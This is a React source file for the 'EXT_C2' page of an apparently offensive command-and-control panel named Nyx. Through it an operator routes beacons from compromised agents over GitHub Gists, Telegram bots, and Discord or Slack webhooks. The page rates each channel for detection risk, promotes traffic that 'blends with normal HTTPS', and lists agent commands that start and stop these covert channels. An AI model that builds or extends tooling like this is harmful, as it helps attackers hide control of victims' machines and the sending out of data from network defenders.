import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Wifi, GitBranch, MessageCircle, Radio, Send, Trash2, RefreshCw, Info, Copy, CheckCircle } from "lucide-react";

interface Agent { id: string; hostname: string; username: string; os: string; }
interface Channel { id: string; type: string; agent_id: string; task_id: string; poll_secs: number; status: string; }

const CHANNEL_TYPES = [
  {
    id: "github", label: "GitHub Gist", icon: GitBranch,
    color: "var(--accent)", border: "rgba(0,255,65,0.3)",
    badge: "Bidirectional", badgeColor: "var(--accent)",
    opsec: "4/10 — api.github.com HTTPS, private gist",
    desc: "Agent polls a private Gist for commands and writes results back. Hardest to detect.",
    fields: [
      { key: "gist_id",    label: "Gist ID",    type: "text",     placeholder: "a1b2c3d4e5f6…" },
      { key: "gist_token", label: "PAT Token",  type: "password", placeholder: "ghp_…" },
      { key: "poll_secs",  label: "Poll (sec)", type: "number",   placeholder: "30" },
    ],
  },
  {
    id: "telegram", label: "Telegram Bot", icon: MessageCircle,
    color: "var(--accent)", border: "rgba(0,255,65,0.3)",
    badge: "Bidirectional", badgeColor: "var(--accent)",
    opsec: "3/10 — api.telegram.org E2E encrypted",
    desc: "Operator sends commands as Telegram messages. Agent polls getUpdates and replies.",
    fields: [
      { key: "bot_token", label: "Bot Token",  type: "password", placeholder: "1234567890:AAF…" },
      { key: "chat_id",   label: "Chat ID",    type: "text",     placeholder: "-100123456789" },
      { key: "poll_secs", label: "Poll (sec)", type: "number",   placeholder: "15" },
    ],
  },
  {
    id: "discord", label: "Discord Webhook",
    icon: ({ size }: { size: number }) => (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor">
        <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.013.043.031.057a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>
      </svg>
    ),
    color: "var(--text-muted)", border: "rgba(154,154,154,0.3)",
    badge: "Mirror only", badgeColor: "#FFB800",
    opsec: "3/10 — discord.com universally allowed",
    desc: "Task results are mirrored to a Discord channel. Operator sends commands via Nyx console.",
    fields: [
      { key: "webhook_url", label: "Webhook URL", type: "text", placeholder: "https://discord.com/api/webhooks/…" },
    ],
  },
  {
    id: "slack", label: "Slack Webhook", icon: Radio,
    color: "var(--text-muted)", border: "rgba(154,154,154,0.3)",
    badge: "Mirror only", badgeColor: "#FFB800",
    opsec: "3/10 — slack.com universally allowed",
    desc: "Task results are mirrored to a Slack channel. Operator sends commands via Nyx console.",
    fields: [
      { key: "webhook_url", label: "Webhook URL", type: "text", placeholder: "https://hooks.slack.com/services/…" },
    ],
  },
];

const API = "http://localhost:8000";
const authHeaders = () => ({ "Content-Type": "application/json", Authorization: `Bearer ${localStorage.getItem("nyx_token")}` });

export default function ExtC2() {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [channels, setChannels] = useState<Channel[]>([]);
  const [selected, setSelected] = useState(CHANNEL_TYPES[0].id);
  const [formData, setFormData] = useState<Record<string, string>>({});
  const [agentID, setAgentID] = useState("");
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState("");

  const typeInfo = CHANNEL_TYPES.find(t => t.id === selected)!;

  useEffect(() => {
    fetch(`${API}/api/agents/`, { headers: authHeaders() })
      .then(r => r.json()).then(setAgents).catch(() => {});
    fetchChannels();
  }, []);

  function fetchChannels() {
    fetch(`${API}/api/extc2/`, { headers: authHeaders() })
      .then(r => r.json()).then(setChannels).catch(() => {});
  }

  async function submit() {
    if (!agentID) return;
    setLoading(true);
    try {
      const res = await fetch(`${API}/api/extc2/`, {
        method: "POST", headers: authHeaders(),
        body: JSON.stringify({ type: selected, agent_id: agentID, ...formData }),
      });
      if (res.ok) { setFormData({}); fetchChannels(); }
    } finally { setLoading(false); }
  }

  async function remove(id: string) {
    await fetch(`${API}/api/extc2/${id}`, { method: "DELETE", headers: authHeaders() });
    fetchChannels();
  }

  function copyCommand(ch: Channel) {
    navigator.clipboard.writeText(`extc2-status`);
    setCopied(ch.id);
    setTimeout(() => setCopied(""), 1500);
  }

  const inputCls = "input-base w-full px-3 py-2 text-xs";

  return (
    <div className="p-6" style={{ background: "var(--bg)", minHeight: "100%" }}>
      <div className="max-w-5xl mx-auto space-y-5">
        {/* Header */}
        <div>
          <h1 className="text-lg font-bold tracking-widest uppercase"
            style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)", textShadow: "0 0 10px rgba(0,255,65,0.5)" }}>
            // EXT_C2
          </h1>
          <p className="text-xs mt-1" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
            beacon over legitimate cloud platforms — traffic blends with normal HTTPS
          </p>
        </div>

        <div className="grid grid-cols-3 gap-5">
          {/* Channel picker */}
          <div className="col-span-1 space-y-2">
            <p className="text-xs tracking-widest uppercase px-1 mb-2"
              style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
              // CHANNEL_TYPE
            </p>
            {CHANNEL_TYPES.map(t => {
              const Icon = t.icon;
              const active = selected === t.id;
              return (
                <motion.button key={t.id}
                  onClick={() => { setSelected(t.id); setFormData({}); }}
                  whileTap={{ scale: 0.97 }}
                  className="w-full text-left p-3"
                  style={{
                    background: active ? "rgba(0,255,65,0.04)" : "transparent",
                    border: `1px solid ${active ? t.border : "var(--border)"}`,
                    cursor: "pointer",
                    borderLeft: active ? `2px solid ${t.color}` : "1px solid var(--border)",
                  }}
                >
                  <div className="flex items-center gap-2">
                    <span style={{ color: active ? t.color : "var(--text-faint)" }}><Icon size={13} /></span>
                    <span className="text-xs font-medium"
                      style={{ fontFamily: "'JetBrains Mono', monospace", color: active ? "var(--text)" : "var(--text-faint)" }}>
                      {t.label}
                    </span>
                  </div>
                  <div className="mt-1.5 flex items-center gap-2">
                    <span className="text-xs px-1.5 py-0.5"
                      style={{ fontFamily: "'JetBrains Mono', monospace",
                        background: `${t.badgeColor}0D`, color: t.badgeColor,
                        border: `1px solid ${t.badgeColor}30` }}>
                      {t.badge}
                    </span>
                  </div>
                </motion.button>
              );
            })}
          </div>

          {/* Config form */}
          <div className="col-span-2 space-y-4">
            {/* Info banner */}
            <div className="p-4" style={{ background: "rgba(0,255,65,0.02)", border: `1px solid ${typeInfo.border}` }}>
              <div className="flex items-start gap-3">
                <Info size={13} style={{ color: "var(--accent)", marginTop: 1, flexShrink: 0 }} />
                <div>
                  <p className="text-xs font-medium" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text)" }}>
                    {typeInfo.label}
                  </p>
                  <p className="text-xs mt-0.5" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                    {typeInfo.desc}
                  </p>
                  <p className="text-xs mt-1.5" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)" }}>
                    OPSEC: {typeInfo.opsec}
                  </p>
                </div>
              </div>
            </div>

            {/* Form */}
            <div className="hud-panel p-4 space-y-4">
              <p className="text-xs tracking-widest"
                style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)" }}>
                // CONFIGURE_CHANNEL
              </p>
              <div>
                <label className="block text-xs mb-1.5 tracking-widest"
                  style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                  TARGET_AGENT
                </label>
                <select value={agentID} onChange={e => setAgentID(e.target.value)} className={inputCls}>
                  <option value="">— select agent —</option>
                  {agents.map(a => (
                    <option key={a.id} value={a.id}>{a.hostname} ({a.username} · {a.os})</option>
                  ))}
                </select>
              </div>
              {typeInfo.fields.map(f => (
                <div key={f.key}>
                  <label className="block text-xs mb-1.5 tracking-widest uppercase"
                    style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                    {f.label}
                  </label>
                  <input type={f.type} placeholder={f.placeholder}
                    value={formData[f.key] || ""}
                    onChange={e => setFormData(prev => ({ ...prev, [f.key]: e.target.value }))}
                    className={inputCls} />
                </div>
              ))}
              <motion.button onClick={submit} disabled={loading || !agentID} whileTap={{ scale: 0.97 }}
                className="btn-primary flex items-center gap-2 px-4 py-2">
                <Send size={11} />
                {loading ? "SENDING..." : "CONFIGURE_AGENT"}
              </motion.button>
            </div>

            {/* Active channels */}
            <div className="hud-panel p-4">
              <div className="flex items-center justify-between mb-3">
                <p className="text-xs tracking-widest"
                  style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)" }}>
                  // ACTIVE_CHANNELS
                </p>
                <button onClick={fetchChannels}
                  style={{ color: "var(--text-faint)", background: "none", border: "none", cursor: "pointer" }}
                  onMouseEnter={e => { (e.currentTarget as HTMLElement).style.color = "var(--accent)"; }}
                  onMouseLeave={e => { (e.currentTarget as HTMLElement).style.color = "var(--text-faint)"; }}>
                  <RefreshCw size={12} />
                </button>
              </div>
              {channels.length === 0 ? (
                <div className="text-center py-8 text-xs" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                  {"[ NO_CHANNELS_CONFIGURED ]"}
                </div>
              ) : (
                <div className="space-y-2">
                  <AnimatePresence>
                    {channels.map(ch => {
                      const t = CHANNEL_TYPES.find(x => x.id === ch.type);
                      const Icon = t?.icon ?? Wifi;
                      return (
                        <motion.div key={ch.id}
                          initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                          className="flex items-center justify-between p-3"
                          style={{ background: "rgba(0,255,65,0.02)", border: "1px solid var(--border)" }}>
                          <div className="flex items-center gap-3">
                            <span style={{ color: "var(--accent)" }}><Icon size={13} /></span>
                            <div>
                              <div className="text-xs font-medium"
                                style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text)" }}>
                                {t?.label ?? ch.type}
                              </div>
                              <div className="text-xs" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                                poll: {ch.poll_secs}s · task: {ch.task_id?.slice(0, 8)}
                              </div>
                            </div>
                          </div>
                          <div className="flex items-center gap-2">
                            <span className="text-xs px-2 py-0.5 status-active"
                              style={{ fontFamily: "'JetBrains Mono', monospace" }}>
                              {ch.status.toUpperCase()}
                            </span>
                            <button onClick={() => copyCommand(ch)}
                              style={{ color: "var(--text-faint)", background: "none", border: "none", cursor: "pointer", padding: 4 }}
                              onMouseEnter={e => { (e.currentTarget as HTMLElement).style.color = "var(--accent)"; }}
                              onMouseLeave={e => { (e.currentTarget as HTMLElement).style.color = "var(--text-faint)"; }}>
                              {copied === ch.id ? <CheckCircle size={12} style={{ color: "var(--accent)" }} /> : <Copy size={12} />}
                            </button>
                            <button onClick={() => remove(ch.id)}
                              style={{ color: "var(--text-faint)", background: "none", border: "none", cursor: "pointer", padding: 4 }}
                              onMouseEnter={e => { (e.currentTarget as HTMLElement).style.color = "var(--red)"; }}
                              onMouseLeave={e => { (e.currentTarget as HTMLElement).style.color = "var(--text-faint)"; }}>
                              <Trash2 size={12} />
                            </button>
                          </div>
                        </motion.div>
                      );
                    })}
                  </AnimatePresence>
                </div>
              )}
            </div>

            {/* Commands reference */}
            <div className="hud-panel p-4">
              <p className="text-xs tracking-widest mb-3" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)" }}>
                // AGENT_COMMANDS
              </p>
              <div className="space-y-2">
                {[
                  ["extc2-github <gist_id> <token> [secs]", "Start GitHub Gist C2 channel"],
                  ["extc2-telegram <bot_token> <chat_id> [secs]", "Start Telegram bot C2"],
                  ["extc2-discord <webhook_url>", "Mirror results to Discord"],
                  ["extc2-slack <webhook_url>", "Mirror results to Slack"],
                  ["extc2-stop", "Stop active C2 channel"],
                  ["extc2-status", "Show current channel status"],
                ].map(([cmd, desc]) => (
                  <div key={cmd} className="flex items-start gap-3">
                    <code className="text-xs px-2 py-1 flex-shrink-0"
                      style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--accent)",
                        background: "rgba(0,255,65,0.05)", border: "1px solid rgba(0,255,65,0.15)" }}>
                      {cmd}
                    </code>
                    <span className="text-xs pt-1" style={{ fontFamily: "'JetBrains Mono', monospace", color: "var(--text-faint)" }}>
                      {desc}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
